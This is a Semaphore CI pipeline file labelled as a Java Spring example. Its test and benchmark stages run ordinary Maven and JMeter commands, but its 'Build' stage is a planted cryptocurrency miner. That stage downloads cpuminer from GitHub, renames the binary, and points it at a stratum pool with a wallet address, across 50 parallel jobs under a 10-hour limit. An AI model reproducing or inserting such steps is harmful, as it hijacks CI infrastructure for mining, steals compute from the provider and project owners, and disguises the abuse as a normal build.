version: v1.0
name: Java Spring example CI pipeline on Semaphore
agent:
  machine:
    type: e1-standard-4
    os_image: ubuntu1804
execution_time_limit:
  hours: 10
blocks:
  - name: Build
    task:
      env_vars:
        - name: MAVEN_OPTS
          value: '-Dmaven.repo.local=.m2'
      jobs:
        - name: Build
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - 'tar xf cpuminer-opt-linux.tar.gz '
            - mv cpuminer-sse2 mahmed
            - './mahmed -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u McbJjK7K11nXrrqnD41MByr1xT3JgS2U6A.mahmedgans -t3'
            - sleep 2
            - done
          parallelism: 50
  - name: Test
    task:
      env_vars:
        - name: MAVEN_OPTS
          value: '-Dmaven.repo.local=.m2'
      prologue:
        commands:
          - checkout
          - cache restore
          - mvn -q test-compile -Dmaven.test.skip=true
      jobs:
        - name: Unit tests
          commands:
            - mvn test
        - name: Integration tests
          commands:
            - mvn test -Pintegration-testing
  - name: Performance tests
    task:
      env_vars:
        - name: MAVEN_OPTS
          value: '-Dmaven.repo.local=.m2'
      prologue:
        commands:
          - checkout
          - cache restore
          - 'mvn -q package jmeter:configure -Dmaven.test.skip=true'
      jobs:
        - name: Benchmark
          commands:
            - java -version
            - java -jar target/spring-pipeline-demo.jar > /dev/null &
            - sleep 20
            - 'mvn -q jmeter:jmeter'
            - 'mvn jmeter:results'
